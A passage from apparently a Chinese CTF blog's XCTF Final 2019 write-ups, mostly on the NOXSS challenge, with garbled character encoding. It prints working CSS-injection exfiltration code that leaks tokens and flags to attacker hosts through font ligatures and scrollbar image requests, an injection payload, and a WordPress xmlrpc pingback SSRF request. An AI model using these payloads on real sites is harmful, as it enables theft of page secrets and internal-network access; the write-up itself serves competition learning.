0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;}\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;~\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;\u0026#34;7\u0026#39; horiz-adv-x=\u0026#39;10000\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;/font\u0026gt; \u0026lt;/defs\u0026gt; \u0026lt;/svg\u0026gt; ä¹Ÿå°±æ˜¯è¯´è¿™é‡Œæ„é€ äº†ä¸€ä¸ªé™¤äº†\u0026quot;7è¿å­—æœ‰ä¸€å®šå®½åº¦ä¹‹å¤–ï¼Œå…¶ä»–å­—ç¬¦éƒ½æ˜¯0å®½åº¦ã€‚\nç¬¬äºŒä¸ªé¡µé¢å°±æ˜¯ font.html ï¼Œå†…å®¹æ¯”è¾ƒç®€å•ï¼Œæ„é€ ä¸€ä¸ªé€‚å½“å®½åº¦çš„ iframe å°† test.html å¼•å…¥å³å¯ã€‚\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;iframe src=\u0026#34;http://127.0.0.1/test.html\u0026#34; frameborder=\u0026#34;0\u0026#34; style=\u0026#34;width:500px\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; è‡³äº width ä¸º 500 pxï¼Œæ˜¯scriptæ ‡ç­¾å†…å†…å®¹é•¿åº¦ï¼Œè¿™ä¸ªéœ€è¦å®½åº¦ä¹Ÿæ¯”è¾ƒå…³é”®ï¼Œå› ä¸º svg ä¸­è¿å­—çš„æ„å»ºä¹Ÿä¸æ˜¯ç‰¹æ¯”å¥½æ„å»ºï¼Œä¹Ÿå°±æ˜¯å¦‚æœæ— æ³•æ„å»ºå¥½è¿å­—ï¼Œä¹Ÿå°±æ— æ³•å¼„å‡ºæ»šåŠ¨æ¡ï¼Œä¹Ÿå°±æ— å¤„è§¦å‘æˆ‘ä»¬æ„é€ çš„è¯·æ±‚äº†ã€‚æ‰€ä»¥ iframe çš„å®½åº¦å¹¶ä¸æ˜¯è¶Šå®½è¶Šå¥½\u0026hellip; svg horiz-adv-x çš„å‚æ•°ä¹Ÿä¸æ˜¯è¶Šå¤§å°±èƒ½è§¦å‘\u0026hellip;\n \nå¦‚æœæŒ‰ç…§åŸä½œè€…è®¾ç½®çš„ iframe width ä¸º 40pxï¼Œsvg è¿å­— horiz-adv-x å‚æ•°ä¸º 1000 çš„è¯ï¼Œå°±ä¼šå‡ºç°å¦‚ä¸Šæƒ…å†µã€‚å¦‚æœå„ä½å°ä¼™ä¼´å»è‡ªå·±å°è¯•ä¸€ä¸‹å°±ä¼šå‘ç°ï¼Œæœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„ lightblue é¢œè‰²çš„ç¬é—´ï¼Œä¹Ÿå°±æ˜¯ script æ ‡ç­¾çš„é¢œè‰²ï¼Œä¸ªäººè®¤ä¸ºå› ä¸ºæµè§ˆå™¨æ¸²æŸ“çš„é¡ºåºé—®é¢˜ï¼Œå…ˆæŠŠåœ¨è¿™ä¸ªåœºæ™¯ä¸­é•¿åº¦ä¸º 463px çš„ script æ ‡ç­¾é¦–å…ˆå› ä¸ºdisplay:tableçš„åŸå› ï¼Œåœ¨ç½‘ç»œè¯·æ±‚å­—ä½“ä¹‹å‰é¦–å…ˆè¢«æ¸²æŸ“äº†ï¼Œæ‰€ä»¥ä¼šçœ‹åˆ°ä¸€æ¡ lightblue é¢œè‰²å¸¦ä¸€é—ªè€Œè¿‡ï¼Œå¯¼è‡´æ’‘ç ´äº† iframe è®¾ç½®çš„é•¿åº¦ï¼Œä¹Ÿå°±äº§ç”Ÿäº†æ»šåŠ¨æ¡ï¼Œéšå³è§¦å‘äº†æˆ‘ä»¬æ„é€ çš„è¯·æ±‚ï¼Œéšåå­—ä½“æ‰ä¼šè¢«æµè§ˆå™¨è¿›è¡Œæ¸²æŸ“ï¼Œç„¶åå°†æˆ‘ä»¬æ„é€ çš„å…¶ä»–å­—ä½“è®¾ä¸º 0 å®½åº¦ã€‚\nè€Œä¸”è¿˜æœ‰ä¸€äº›é—®é¢˜å°±æ˜¯ç¼“å­˜çš„é—®é¢˜ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š\n \nè¿™ä¹Ÿæ˜¯åŸä½œè€…åœ¨åŸæ–‡æåˆ°çš„å…ˆå‘é€ä¸€ä¸ªè¯·æ±‚è®© chrome ç¼“å­˜å¥½å­—ä½“çš„åŸå› ï¼Œä½†æ˜¯è¿™ä¸ªæ–¹æ³•åŠå…¶ä¸ç¨³å®š\u0026hellip;ç”¨åŸä½œè€…çš„ä»£ç ç›´æ¥è·‘è·‘çš„ç»“æœä¹Ÿæ˜¯äº”èŠ±å…«é—¨ï¼Œæ¯æ¬¡è·‘éƒ½ä¸ä¸€æ ·ã€‚\nç„¶åæ¯”è¾ƒç¨³å®šçš„åŠæ³•æ˜¯ï¼Œé¢„æµ‹ script æ ‡ç­¾å†…çš„é•¿åº¦ï¼Œæ¯”å¦‚è¿™é‡Œçš„ 463px ï¼Œæˆ‘ä»¬è®¾ç½®ä¸€ä¸ªæ¯”å®ƒå¤§çš„å€¼ï¼Œè¿™æ ·ä¸€å¼€å§‹çš„æ¸²æŸ“å°±ä¸ä¼šå½±å“åˆ°æˆ‘ä»¬çš„ç»“æœäº†ï¼Œå¯¹åº”çš„è¿å­— horiz-adv-x æˆ‘ä»¬ä¹Ÿå°†å…¶æ‰©å¤§åˆ° 500000 ï¼Œè¿™æ ·å°±èƒ½ä¿è¯æ¯æ¬¡éƒ½å¯ä»¥ä»¥æ­£ç¡®çš„ç»“æœé€ æˆå®½åº¦æº¢å‡ºç„¶åè§¦å‘æˆ‘ä»¬çš„è¯·æ±‚äº†ã€‚\nButï¼Œè¿™ä¸ªåŠæ³•éœ€è¦çŸ¥é“å¤§æ¦‚ script æ ‡ç­¾å†…å¤§æ¦‚çš„å®½åº¦ï¼Œä¸‡ä¸€ä¸çŸ¥é“å‘¢ï¼Ÿ\næˆ‘ä»¬å¯ä»¥å‚è€ƒ ROIS çš„åšæ³•ï¼Œä½¿ç”¨ iframe çš„ onload äº‹ä»¶ï¼Œå½“ iframe åŠ è½½å®Œæˆä¹‹åå†å°† iframe å®½åº¦ç¼©å°ï¼Œè¿™æ ·å°±èƒ½ç¨³å®šè§¦å‘äº†ã€‚ä¹Ÿå°±æ˜¯è¯´ font.html ä¸­ iframe æˆ‘ä»¬å¯ä»¥è¿™ä¹ˆå†™ï¼š\n\u0026lt;iframe src=\u0026#34;http://127.0.0.1/test.html\u0026#34; frameborder=\u0026#34;0\u0026#34; style=\u0026#34;width:10000px\u0026#34; onload=\u0026#34;event.target.style.width=\u0026#39;100px\u0026#39;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; ä¸€å¼€å§‹è®¾ç½®ä¸€ä¸ªç‰¹åˆ«å¤§çš„å®½åº¦ï¼Œä¿è¯ä¸ä¼šå› ä¸ºæ¸²æŸ“é¡ºåºçš„åŸå› è§¦å‘æˆ‘ä»¬æ„é€ çš„è¯·æ±‚ï¼Œå¾…åˆ° iframe å†…å­—ä½“åŠ è½½å®Œæ¯•ï¼Œå†å°†å…¶å®½åº¦ç¼©å°ï¼Œè§¦å‘æˆ‘ä»¬æ„é€ çš„è¯·æ±‚ã€‚\nä»¥ä¸‹æ˜¯åŸä½œè€…ä½¿ç”¨äºŒåˆ†åŠ å¿«çˆ†ç ´ã€æå‰ç¼“å­˜é¿å…ç¼“å­˜é—®é¢˜æ„é€ çš„ index.html ä»£ç ï¼š\n\u0026lt;!doctype html\u0026gt;\u0026lt;meta charset=utf-8\u0026gt; \u0026lt;script src=cookie.js\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;big id=token\u0026gt;\u0026lt;/big\u0026gt;\u0026lt;br\u0026gt; \u0026lt;script\u0026gt; (async function() { const EXPECTED_TOKEN_LENGTH = 32; const ALPHABET = \u0026#39;0123456789abcdef\u0026#39;; // W poniÅ¼szym elemencie bÄ™dziemy wypisywaÄ‡ przeczytany token.  const outputElement = document.getElementById(\u0026#39;token\u0026#39;); // W tej zmiennej przechowamy token, ktÃ³ry udaÅ‚o siÄ™ juÅ¼  // wydobyÄ‡  let extractedToken = \u0026#39;\u0026#39;; // W tej zmiennej przechowamy prefix do tworzenia ligatur  let prefix = \u0026#39;\u0026#34;\u0026#39;; // Wysokopoziomowo: po prostu wyciÄ…gamy kolejny znak tokena  // dopÃ³ki nie wyciÄ…gnÄ™liÅ›my wszystkich znakÃ³w :)  while (extractedToken.length \u0026lt; EXPECTED_TOKEN_LENGTH) { const nextTokenChar = await getNextTokenCharacter(); extractedToken += nextTokenChar; // Znak, ktÃ³ry wyciÄ…gnÄ™liÅ›my musi byÄ‡ teÅ¼ dodany do przedrostka  // dla nastÄ™pnych ligatur.  prefix += nextTokenChar; // Wypiszmy w HTML-u jaki token jak na razie wyciÄ…gnÄ™liÅ›my.  outputElement.textContent = extractedToken; } // Jak dotarliÅ›my tutaj, to znaczy, Å¼e mamy caÅ‚y token!  // W ramach Å›wiÄ™towania usuÅ„my wszystkie iframe\u0026#39;y i ustawmy  // pogrubienie na tokenie widocznym w HTML-u ;-)  deleteAllIframes(); outputElement.style.fontWeight = \u0026#39;bold\u0026#39;; // Funkcja, ktÃ³rej celem jest wydobycie nastÄ™pnego znaku tokena  // metodÄ… dziel i zwyciÄ™Å¼aj.  async function getNextTokenCharacter() { // Dla celÃ³w wydajnoÅ›ciowych - usuÅ„my wszystkie istniejÄ…ce elementy iframe.  deleteAllIframes(); let alphabet = ALPHABET; // Wykonujemy operacje tak dÅ‚ugo aÅ¼ wydobÄ™dziemy informacjÄ™  // jaki jest nastÄ™pny znak tokena.  while (alphabet.length \u0026gt; 1) { // BÄ™dziemy oczekiwaÄ‡ na utworzenie nowego ciasteczka - najpierw wiÄ™c  // usuÅ„my wszystkie istniejÄ…ce.  clearAllCookies(); const [leftChars, rightChars] = split(alphabet); // Najpierw upewniamy siÄ™, Å¼e fonty dla obu zestawÃ³w ligatur  // sÄ… w cache\u0026#39;u.  await makeSureFontsAreCached(leftChars, rightChars); // Niestety - praktyczne testy pokazaÅ‚y, Å¼e wrzucenie w to miejsce  // sztucznego opÃ³Åºnienia znaczÄ…co zwiÄ™ksza prawdopodobieÅ„stwo, Å¼e atak  // po drodze siÄ™ nie \u0026#34;wysypie\u0026#34;...  await delay(100); // A potem tworzymy dwa iframe\u0026#39;y z \u0026#34;atakujÄ…cym\u0026#34; CSS-em  await Promise.all([createAttackIframe(leftChars), createAttackIframe(rightChars)]); // Czekamy na znaki z poÅ‚Ä…czenia zwrotnego...  const chars = await getCharsFromReverseConnection(); // ... i na ich podstawie kontynuujemy \u0026#34;dziel i zwyciÄ™Å¼aj\u0026#34;.  alphabet = chars; } // JeÅ›li znaleÅºliÅ›my siÄ™ w tym miejscu, to znaczy, Å¼e alphabet  // ma jeden znak. Wniosek: ten jeden znak to kolejny znak tokena.  return alphabet; } function clearAllCookies() { Object.keys(Cookies.get()).forEach(cookie =\u0026gt; { Cookies.remove(cookie); }); } function deleteAllIframes() { document.querySelectorAll(\u0026#39;iframe\u0026#39;).forEach(iframe =\u0026gt; { iframe.parentNode.removeChild(iframe); }); } // Funkcja dzielÄ…ca string na dwa stringi o tej  // samej dÅ‚ugoÅ›ci (lub rÃ³Å¼nej o jeden).  // Np. split(\u0026#34;abcd\u0026#34;) == [\u0026#34;ab\u0026#34;, \u0026#34;cd\u0026#34;];  function split(s) { const halfLength = parseInt(s.length / 2); return [s.substring(0, halfLength), s.substring(halfLength)]; } // Funkcja generujÄ…ca losowego stringa, np.  // randomValue() == \u0026#34;rand6226966173982633\u0026#34;  function randomValue() { return \u0026#34;rand\u0026#34; + Math.random().toString().slice(2); } // Generujemy CSS-a, ktÃ³ry zapewni nam, Å¼e fonty znajdÄ… siÄ™ w cache.  // Jako dowÃ³d na to, Å¼e font zostaÅ‚ juÅ¼ pobrany, uÅ¼yjemy sprawdzenia  // czy ciasteczko font_${losowy_ciÄ…g_znakÃ³w} zostaÅ‚o zdefiniowane.  function makeSureFontsAreCached(leftChars, rightChars) { return new Promise(resolve =\u0026gt; { // Enkodujemy wszystkie wartoÅ›ci, by mÃ³c umieÅ›ciÄ‡ je bezpiecznie w URL-u.  let encodedPrefix; [encodedPrefix, leftChars, rightChars] = [prefix, leftChars, rightChars].map(val =\u0026gt; encodeURIComponent(val)); // Generujemy CSS-a odwoÅ‚ujÄ…cego siÄ™ do obu fontÃ³w. UÅ¼ywamy body:before i body:after  // by upewniÄ‡ siÄ™, Å¼e przeglÄ…darka bÄ™dzie musiaÅ‚a oba fonty pobraÄ‡.  const css = ` @font-face { font-family: \u0026#39;hack1\u0026#39;; src: url(http://192.168.13.37:3001/font/${encodedPrefix}/${leftChars}) } @font-face { font-family: \u0026#39;hack2\u0026#39;; src: url(http://192.168.13.37:3001/font/${encodedPrefix}/${rightChars}) } body:before { content: \u0026#39;x\u0026#39;; font-family: \u0026#39;hack1\u0026#39;; } body:after { content: \u0026#39;x\u0026#39;; font-family: \u0026#39;hack2\u0026#39;; } `; // Tworzymy iframe, w ktÃ³rym zaÅ‚adowane zostanÄ… fonty  const iframe = document.createElement(\u0026#39;iframe\u0026#39;); iframe.onload = () =\u0026gt; { // Funkcja zakoÅ„czy swoje dziaÅ‚anie dopiero gdy zostanie wyzwolone zdarzenie  // onload w elemencie iframe  resolve(); } iframe.src = \u0026#39;http://localhost:12345/?css=\u0026#39; + encodeURIComponent(css); document.body.appendChild(iframe); }) } // Jak wywoÅ‚ana zostaje ta funkcja, to juÅ¼ mamy pewnoÅ›Ä‡, Å¼e fonty  // sÄ… w cache\u0026#39;u. SprÃ³bujmy wiÄ™c zaatakowaÄ‡ z takim stylem, w wyniku  // ktÃ³rego pojawi siÄ™ pasek przewijania, jeÅ›li trafiliÅ›my ze znakami  // w tokenie.  function createAttackIframe(chars) { return new Promise(resolve =\u0026gt; { // Enkodujemy wszystkie wartoÅ›ci, by mÃ³c umieÅ›ciÄ‡ je bezpiecznie w URL-u.  let encodedPrefix; [encodedPrefix, chars] = [prefix, chars].map(val =\u0026gt; encodeURIComponent(val)); const css = ` @font-face { font-family: \u0026#34;hack\u0026#34;; src: url(http://192.168.13.37:3001/font/${encodedPrefix}/${chars}) } script { display: table; font-family: \u0026#34;hack\u0026#34;; white-space: nowrap; } body::-webkit-scrollbar { background: blue; } body::-webkit-scrollbar:horizontal { background: blue url(http://192.168.13.37:3001/reverse/${chars}); } `; const iframe = document.createElement(\u0026#39;iframe\u0026#39;); iframe.onload = () =\u0026gt; { resolve(); } iframe.src = \u0026#39;http://localhost:12345/?css=\u0026#39; + encodeURIComponent(css); // Ten iframe musi byÄ‡ stosunkowo wÄ…ski - by pojawiÅ‚ siÄ™ pasek przewijania.  iframe.style.width = \u0026#34;40px\u0026#34;; document.body.appendChild(iframe); }) } // Sprawdzamy co 20ms czy dostaliÅ›my poÅ‚Ä…czenie zwrotne wygenerowane  // przez pasek przewijania. JeÅ›li tak - to zwracamy wartoÅ›Ä‡ z ciasteczka chars.  function getCharsFromReverseConnection() { return new Promise(resolve =\u0026gt; { const interval = setInterval(() =\u0026gt; { const chars = Cookies.get(\u0026#39;chars\u0026#39;); if (chars) { clearInterval(interval); resolve(chars); } }, 20); }) } async function delay(time) { return new Promise(resolve =\u0026gt; { setTimeout(resolve, time); }) } })(); \u0026lt;/script\u0026gt; ä½†æ˜¯æˆ‘æ²¡æˆåŠŸè¿‡2333\u0026hellip;\nNOXSS ç»ˆäºå¯ä»¥å›åˆ°æˆ‘ä»¬çš„é¢˜ç›®äº†ï¼Œå…¶å®èµ°å®Œä»¥ä¸Šæµç¨‹ï¼Œè¿™ä¸ªé¢˜ç›®å·²ç»è¿åˆƒè€Œè§£äº†ï¼Œå‡ºé¢˜äººå‡ºçš„ç‚¹ä¹Ÿæ­£æ˜¯ token2 çš„ç‚¹ã€‚\néšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ theme å‚æ•°å‘ç°æœ‰ä»£ç æ³¨å…¥çš„åœ°æ–¹ï¼Œä½†æ˜¯è¿‡æ»¤äº†å°–æ‹¬å·ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨%0aè¿›è¡Œæ¢è¡Œ\n \nä½†æ˜¯æˆ‘ä»¬çš„æœ€ç»ˆç›®çš„è·Ÿ token2 åœºæ™¯ç±»ä¼¼ï¼Œè¿˜æ˜¯æ‹¿åˆ° script æ ‡ç­¾ä¸­çš„ secret å˜é‡\n \næ ¹æ® token2 åœºæ™¯çš„è§£æ³•ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è‡³å°‘éœ€è¦åšåˆ°å¯ä»¥æ‰§è¡Œæˆ‘ä»¬ä»»æ„ css ä»£ç æ‰è¡Œã€‚\næ ¹æ®æ–‡æ¡£css newlineï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“æ¢è¡Œæœ‰å¦‚ä¸‹å†™æ³•ï¼š\n \nè€Œä¸”æ–‡æ¡£é‡Œä¹Ÿæåˆ°äº†error-handling\n â€‹\tWhen errors occur in CSS, the parser attempts to recover gracefully, throwing away only the minimum amount of content before returning to parsing as normal. This is because errors arenâ€™t always mistakesâ€”new syntax looks like an error to an old parser, and itâ€™s useful to be able to add new syntax to the language without worrying about stylesheets that include it being completely broken in older UAs.\n css å…¼å®¹æ€§æ¯”è¾ƒå¼ºï¼Œå¯¹äºé”™è¯¯çš„å¤„ç†ä¹Ÿæ¯”è¾ƒå®½æ¾ï¼Œè¿™é‡Œç”±äºè‡ªå·±çš„çŸ¥è¯†æœ‰é™ï¼Œä¹Ÿæš‚æ—¶æ²¡æœ‰æ‰¾åˆ° chrome å¯¹äº css é”™è¯¯å¤„ç†ç›¸å…³çš„å†…å®¹ï¼Œä½†æ˜¯ç»è¿‡æˆ‘ä»¬ä¸æ–­å°è¯•ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ä½¿ç”¨å¦‚ä¸‹ payload å¯ä»¥ä»»æ„æ‰§è¡Œæˆ‘ä»¬çš„ css ä»£ç ï¼š\n%0a){}body{background:red}%2f* å¯¹äºä»¥ä¸Šï¼Œé—®äº† @zsx å¸ˆå‚…ï¼Œä»¥ä¸‹æ˜¯ä»–çš„åŸè¯ï¼ˆä½ çœ‹çœ‹è¿™æ˜¯äººè¯´çš„å—orzï¼‰ï¼š\n â€‹\tæˆ‘wpå†™äº†ï¼Œçœ‹äº†ä¸‹w3cæ ‡å‡†ï¼Œå†éšä¾¿fuzzä¸€ä¸‹å°±okäº†\n æˆ‘çš„ç†è§£æ˜¯è¿™é‡Œç”¨%0aè¿›è¡Œäº†æ¢è¡Œï¼Œä½†æ˜¯ç”±äºæ‹¬å·çš„è§£æè¿˜æ²¡ç»“æŸï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨)æ¥å°†importçš„æ‹¬å·è¿›è¡Œé—­åˆï¼Œç„¶åå†ç”¨{}åˆ¶å®šç©ºæ ·å¼ï¼Œåé¢å°±å¯ä»¥ä»»æ„æ³¨å…¥ css ä»£ç äº†ã€‚\nå¦‚æœæœ‰å¸ˆå‚…çœ‹äº† chromium æœ‰éå¸¸ç¡¬æ ¸çš„ç†è§£ï¼Œè¿˜æœ›ä¸åèµæ•™ï¼Œå¸¦å¸¦æˆ‘è¿™ä¸ªèœé¸¡ã€‚//æ„Ÿè§‰æœ¬æ–‡çš„å…³é”®ç‚¹ä¹Ÿä¸åœ¨è¿™\nç„¶åæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ token2 çš„æ–¹æ³•ï¼Œåˆ©ç”¨æ»šåŠ¨æ¡æ¥ leak secret äº†ï¼Œåªè¦è‡ªå·±åšä¸ª iframe å¼•ç”¨æˆ‘ä»¬æ„é€ çš„ payload å³å¯ï¼Œæ¯”å¦‚\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; //const chars = [\u0026#39;t\u0026#39;,\u0026#39;f\u0026#39;]  const chars = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_\u0026#39;.split(\u0026#39;\u0026#39;) let ff = [], data = \u0026#39;\u0026#39; let prefix = \u0026#39;xctf{\u0026#39; chars.forEach(c =\u0026gt; { var css = \u0026#39;\u0026#39; css = \u0026#39;?theme=../../../../\\fa{}){}\u0026#39; css += `body{overflow-y:hidden;overflow-x:auto;white-space:nowrap;display:block}html{display:block}*{display:none}body::-webkit-scrollbar{display:block;background: blue url(http://172.16.71.138:9999/?${encodeURIComponent(prefix+c)})}` css += `@font-face{font-family:a${c.charCodeAt()};src:url(http://172.16.71.138:23460/font/${prefix}/${c});}` css += `script{font-family:a${c.charCodeAt()};display:block}` document.write( \u0026#39;\u0026lt;iframe scrolling=yes samesite src=\u0026#34;http://127.0.0.1/noxss.php?theme=\u0026#39; + encodeURIComponent(css) + \u0026#39;\u0026#34; style=\u0026#34;width:1000000px\u0026#34; onload=\u0026#34;event.target.style.width=\\\u0026#39;100px\\\u0026#39;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026#39;) }) \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; è¿™é‡Œæˆ‘ç”¨ php ç®€å•æ¨¡æ‹Ÿäº†é¢˜ç›®ç¯å¢ƒï¼Œåšèµ·æ¥æ¯”è¾ƒç®€ä¾¿ï¼Œä¹Ÿæ¯”è¾ƒå¼€å¿ƒ\n \nAnd\u0026hellip;\n \nç°åœºåšå‡ºæ¥çš„çœŸæ˜¯ CSS å¸¦å¸ˆ orz\u0026hellip;\nReference XCTF final 2019 Writeup By ROIS\né€šè¿‡CSSæ³¨å…¥çªƒå–HTMLä¸­çš„æ•°æ®\nWykradanie danych w Å›wietnym stylu â€“ czyli jak wykorzystaÄ‡ CSS-y do atakÃ³w na webaplikacjÄ™\n","date":"2019-11-21T00:37:14Z","permalink":"https://blog.zeddyu.info/2019/11/21/XCTF-Final-noxss/","title":"XCTF Final NOXSS Write Up"},{"content":"æˆ‘ä»¬ SU è¿™æ¬¡ä¸€å…±åšå‡ºäº†3ä¸ª Web ï¼Œç”±äºä»Šå¹´ XCTF Final çš„æ—¶é—´ä¸æ˜¯ç‰¹åˆ«å¥½ï¼Œæˆ‘ä»¬é˜Ÿå…¶ä»–å¸ˆå‚…æœ‰è€ƒè¯•çš„è€ƒè¯•ï¼ŒåŸºæœ¬å°±ç°åœºçš„ä¸¤ä¸ª Web æ‰‹åœ¨åšï¼Œæœ€å LFI2019 æ¯”è¾ƒå¯æƒœï¼Œå¦‚æœå¤šä¸ªå‡  min æˆ‘ä»¬å°±å¯ä»¥å‡ºäº†ï¼Œå®åœ¨å¯æƒœã€‚ä¸‹é¢å°±å†™å†™æœ¬æ¬¡çš„ Web Write Upã€‚\n[TOC]\nWeb babyblog ç•Œé¢è·Ÿ Byte CTF çš„ babyblog ä¸€è‡´ï¼Œæœ‰äº›åŠŸèƒ½è¿˜ä¿ç•™ç€ï¼Œå¾ˆæœ‰è¯¯å¯¼æ€§\u0026hellip;ä»¥ä¸ºæ˜¯ä¸ªå‡çº§ç‰ˆï¼Œå‰è€…æ˜¯ä¸€é“äºŒæ¬¡æ³¨å…¥åç”¨ php æ­£åˆ™/eç‰¹æ€§æ¥æ‰§è¡Œå‘½ä»¤çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸€å¼€å§‹ä¹Ÿå°±ä¸€ç›´åœ¨æ—¥æ³¨å…¥äº†\u0026hellip;\nåæ¥æˆ‘å‘ç°/userä¸ªäººç•Œé¢æœ‰ ip è®°å½•ï¼Œäºæ˜¯å°è¯• XFF æ³¨å…¥æ— æœï¼Œä½†æ˜¯å¯ä»¥æŠŠ XFF ç›´æ¥å›æ˜¾åˆ°é¡µé¢ä¸Šã€‚å‘ç°/server_statusï¼Œå‘ç°æœ‰å¤§å®¶çš„è®¿é—®è®°å½•ã€‚é™·å…¥æ€è€ƒing\u0026hellip;\né˜Ÿå‹çªç„¶çœ‹åˆ°æœ‰ä¸€ä¸ªè®¿é—®è®°å½•/user/1.cssï¼ˆç±»ä¼¼çš„è¿™ä¹ˆä¸€ä¸ªè·¯ç”±ï¼Œä¸å¤ªæƒ³å¾—èµ·æ¥äº†ï¼‰ï¼Œé©¬ä¸Šæƒ³åˆ°å¯èƒ½æ˜¯ç¼“å­˜æŠ•æ¯’ï¼Œè”æƒ³è·Ÿä¸Šæ–‡è¯´çš„ XFF çš„è®¾ç½®ï¼Œæƒ³åˆ°å¯ä»¥ç¼“å­˜æŠ•æ¯’å°†åå°„ xss å˜æˆç¼“å­˜ xss ï¼Œè¿™æ ·å°±å¯ä»¥æ‰“åˆ° admin äº†ã€‚\n \nbabypress è¿™é¢˜æ¯”è¾ƒç‹—è¡€\u0026hellip;å‰ä¸€å¤©ç»™äº†ä¸¤ä¸ª hint :\nfirst hint for babypress: ssrf n-day exploit on the internet will not work second hint: if you can exploit in your local, it should be possible to exploit in remote. éšä¾¿æœä¸€ä¸‹æˆ‘ä»¬å¤§æ¦‚å¯ä»¥çŸ¥é“ ssrf n-day æ˜¯é€šè¿‡ xmlrpc.php è¿™ä¸ªæ–‡ä»¶æ¥æ‰“å†…ç½‘çš„ï¼Œç„¶åå½“æ™šæˆ‘ä»¬é€šè¿‡xmlrpc.phpæˆåŠŸè¿›è¡Œäº† SSRF ï¼Œå½“çœ‹åˆ°äº†è¿™ä¸¤ä¸ª hint \u0026hellip;æˆ‘ä»¬å°±æ„Ÿè§‰ä¸å¦™ï¼Œåº”è¯¥æ‰“çš„ä¸æ˜¯æˆ‘ä»¬è¿™ä¸ªï¼Œ but æˆ‘ä»¬ç¡®å®æ‰“æˆåŠŸäº†å‘€\u0026hellip;äºæ˜¯æˆ‘ä»¬å½“æ™šåˆåŠ äº†ä¸€ä¼šç­ï¼Œå½“æ—¶æœ€æ–°ç‰ˆæœ¬æ˜¯ 5.2.4 ï¼Œäºæ˜¯æˆ‘ä»¬æ‰¾åˆ° 5.2.4 çš„ security issueï¼Œç„¶åæ‰¾åˆ°äº†æ›´æ–°è¡¥ä¸ï¼Œä½†æ˜¯æ„Ÿè§‰ç»•ä¸è¿‡\u0026hellip;ä»¥ä¸ºæ˜¯ä¸ªæ–°çš„ç»•è¿‡æ–¹å¼å•¥çš„\u0026hellip;\nå¥½äº†ï¼Œç»“æœåˆ°äº†ç¬¬äºŒå¤©ä¸€å¼€å§‹æ²¡äººæ‰“æˆåŠŸ\u0026hellip;åæ¥ï¼Œåˆ°äº†å·®ä¸å¤šä¸­åˆä¸»åŠæ–¹åˆå‘å…¬å‘Šæ›´æ¢ç¯å¢ƒï¼Œå½“æ—¶æˆ‘ä»¬éƒ½åœ¨çœ‹å¦ä¸€ä¸ªé¢˜ï¼Œä¹Ÿå°±æ²¡ç®¡ï¼Œç»“æœä¸€ä¼šæœ‰ä¸¤ä¸ªé˜Ÿå‡ºäº†\u0026hellip;ç„¶åæˆ‘ä»¬è¯•äº†ä¸€ä¸‹æ˜¨æ™šæˆ‘ä»¬æ‰“xmlrpc.phpçš„ï¼Œå°±æˆäº†\u0026hellip;\n\u0026lt;methodCall\u0026gt; \u0026lt;methodName\u0026gt;pingback.ping\u0026lt;/methodName\u0026gt; \u0026lt;params\u0026gt;\u0026lt;param\u0026gt; \u0026lt;value\u0026gt;\u0026lt;string\u0026gt;http://\u0026lt;YOUR SERVER \u0026gt;:\u0026lt;port\u0026gt;\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;/param\u0026gt;\u0026lt;param\u0026gt;\u0026lt;value\u0026gt;\u0026lt;string\u0026gt;http://\u0026lt;SOME VALID BLOG FROM THE SITE \u0026gt;\u0026lt;/string\u0026gt; \u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt;\u0026lt;/params\u0026gt; \u0026lt;/methodCall\u0026gt; ä¸»è¦å°±æ˜¯è¦å‘ä¸€ä¸ªè¯„è®ºä»¥åŠæ›´æ”¹ä¸€ä¸‹ç¬¬äºŒä¸ªå‚æ•°ä¸ºä»–çš„ host 